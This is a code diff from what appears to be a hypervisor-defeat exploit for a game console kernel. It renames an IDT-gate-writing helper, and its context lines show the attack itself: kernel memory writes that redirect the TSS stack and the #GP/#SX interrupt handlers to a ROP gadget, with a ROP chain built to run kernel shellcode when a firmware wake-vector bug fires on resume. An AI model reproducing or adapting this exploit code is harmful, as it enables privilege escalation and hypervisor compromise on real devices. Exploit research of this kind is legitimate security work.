@@ -14,20 +14,6 @@
 #define APICBASE_ENABLED 0x00000800
 #define APICBASE_BSP 0x00000100
 
-static void setidt(int idx, uintptr_t func, int typ, int dpl, int ist) {
-  struct gate_descriptor ip = {};
-  ip.gd_looffset = func;
-  ip.gd_selector = GSEL(GCODE_SEL, SEL_KPL);
-  ip.gd_ist = ist;
-  ip.gd_xx = 0;
-  ip.gd_type = typ;
-  ip.gd_dpl = dpl;
-  ip.gd_p = 1;
-  ip.gd_hioffset = func >> 16;
-  kwrite(ktext + env_offset.IDT + idx * sizeof(struct gate_descriptor), &ip,
-         sizeof(ip));
-}
-
 static uint64_t get_hv_stack(void) {
   if (fw >= 0x0700 && fw < 0x0800) {
     return 0x628ec000;
@@ -123,16 +109,16 @@ int hv_defeat_0607(void *shellcode_kernel, size_t shellcode_kernel_len) {
   kwrite64(ktext + env_offset.COMMON_TSS + 0 * sizeof(struct amd64tss) +
                offsetof(struct amd64tss, tss_ist6),
            ist_gp + 0x1000);
-  setidt(IDT_GP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
-         SEL_KPL, 6);
+  set_idt_gate(IDT_GP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
+               SEL_KPL, 6);
 
   uintptr_t ist_sx = pa_to_dmap(alloc_page());
   build_sx_rop(ist_sx, shellcode_kernel_len);
   kwrite64(ktext + env_offset.COMMON_TSS + 0 * sizeof(struct amd64tss) +
                offsetof(struct amd64tss, tss_ist7),
            ist_sx + 0x1000);
-  setidt(IDT_SX, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
-         SEL_KPL, 7);
+  set_idt_gate(IDT_SX, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
+               SEL_KPL, 7);
 
   // During suspend, AcpiSetFirmwareWakingVector will corrupt its own pointer,
   // and during resume it will trigger #GP, thus executing our ROP chain.
